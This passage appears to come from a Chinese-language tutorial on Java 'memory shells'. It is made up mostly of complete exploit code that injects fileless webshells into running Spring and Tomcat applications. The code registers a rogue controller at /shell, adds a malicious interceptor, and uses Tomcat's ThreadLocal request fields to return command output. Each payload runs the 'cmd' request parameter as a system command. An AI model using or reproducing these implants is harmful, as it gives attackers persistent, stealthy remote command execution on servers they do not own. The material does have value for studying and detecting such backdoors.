import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@Controller
public class test {
    @RequestMapping("/hello")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //获取当前上下文环境
        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
        //WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Shell.class.getDeclaredMethod("shell");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Shell(), method);

    }

    public class Shell{

        public Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}
```

```java
package com.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

@Controller
public class test {
    @RequestMapping("/hello")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {

        //获取当前上下文环境
        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
        //WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

               // 通过 context 获取 RequestMappingHandlerMapping 对象
       RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

       // 获取父类的 MappingRegistry 属性
       Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
       f.setAccessible(true);
       Object mappingRegistry = f.get(mapping);

       // 反射调用 MappingRegistry 的 register 方法
       Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");

       Method[] ms = c.getDeclaredMethods();

//     // 判断当前路径是否已经添加
//     Field field = c.getDeclaredField("urlLookup");
//     field.setAccessible(true);
//
//     Map<String, Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
//     for (String urlPath : urlLookup.keySet()) {
//        if ("/shell".equals(urlPath)) {
//           System.out.println("controller url path exist already");
//           return;
//        }
//     }

       // 初始化一些注册需要的信息
       PatternsRequestCondition       url       = new PatternsRequestCondition("/shell");
       RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
       RequestMappingInfo             info      = new RequestMappingInfo(url, condition, null, null, null, null, null);

       Shell sh = new Shell();

       for (Method method : ms) {
          if ("register".equals(method.getName())) {
             // 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index
             method.setAccessible(true);
             method.invoke(mappingRegistry, info, sh, Shell.class.getMethod("shell"));
          }
       }

    }

    public class Shell{

        public Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}
```

#### Interceptor内存马

获取adaptedInterceptors

```
org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
field.setAccessible(true);
java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
```

###### exp:

```java
package com.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.HandlerMapping;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.Map;

@Controller
public class test {
    @RequestMapping("/hello")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {


       WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
       // 通过 context 获取 RequestMappingHandlerMapping 对象
        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
       Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
       field.setAccessible(true);
       ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(abstractHandlerMapping);
       adaptedInterceptors.add(new Shell());
    }
    public class Shell implements HandlerInterceptor {
       @Override
       public boolean preHandle(HttpServletRequest request, HttpServletResponse var2, Object var3) throws Exception{
          String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
                return true;
            }
            return false;
       }
       public void postHandle(HttpServletRequest var1, HttpServletResponse var2, Object var3, ModelAndView var4) throws Exception{};

    public void afterCompletion(HttpServletRequest var1, HttpServletResponse var2, Object var3, Exception var4) throws Exception{};


    }

}
```

## 内存马回显技术

#### ThreadLocal

`org.apache.catalina.core.ApplicationFilterChain`类中有两个static变量*`lastServicedRequest`*和*`lastServicedResponse`*

```
static {
    if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
        lastServicedRequest = new ThreadLocal();
        lastServicedResponse = new ThreadLocal();
    } else {
        lastServicedRequest = null;
        lastServicedResponse = null;
    }
```

`ApplicationFilterChain#internalDoFilter`中，Tomcat会将request对象和response对象存储到这两个变量中

```
try {
    if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
        lastServicedRequest.set(request);
        lastServicedResponse.set(response);
    }
```

所有可反射获取ApplicationDispatcher.WRAP_SAME_OBJECT改为true

通过`ThreadLocal#get`方法将request和response对象从*`lastServicedRequest`*和*`lastServicedResponse`*中取出

```java
//反射获取所需属性

Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");

Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");

Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");



//使用modifiersField反射修改final型变量

Field modifiersField = Field.class.getDeclaredField("modifiers");

modifiersField.setAccessible(true);

modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);

modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);

modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);

WRAP_SAME_OBJECT_FIELD.setAccessible(true);

lastServicedRequestField.setAccessible(true);

lastServicedResponseField.setAccessible(true);



//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量

if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)){

    WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);

}



if (lastServicedRequestField.get(null)==null){

    lastServicedRequestField.set(null, new ThreadLocal<>());

}



if (lastServicedResponseField.get(null)==null){

    lastServicedResponseField.set(null, new ThreadLocal<>());

}



//获取request变量
ServletRequest servletRequest=null;
if(lastServicedRequestField.get(null)!=null) {

    ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);
   servletRequest = (ServletRequest) threadLocal.get();
}

//获取response变量
ServletResponse servletResponse = null;
if(lastServicedResponseField.get(null)!=null){
    ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null);
    servletResponse = (ServletResponse) threadLocal.get();
}

try {
    PrintWriter writer = servletResponse.getWriter();
    Scanner scanner = new Scanner(Runtime.getRuntime().exec(servletRequest.getParameter("cmd")).getInputStream()).useDelimiter("\\A");
    String result = scanner.hasNext()?scanner.next():"";
    scanner.close();
    writer.write(result);
    writer.flush();
    writer.close();
} catch (IOException e) {
    throw new RuntimeException(e);
}
```

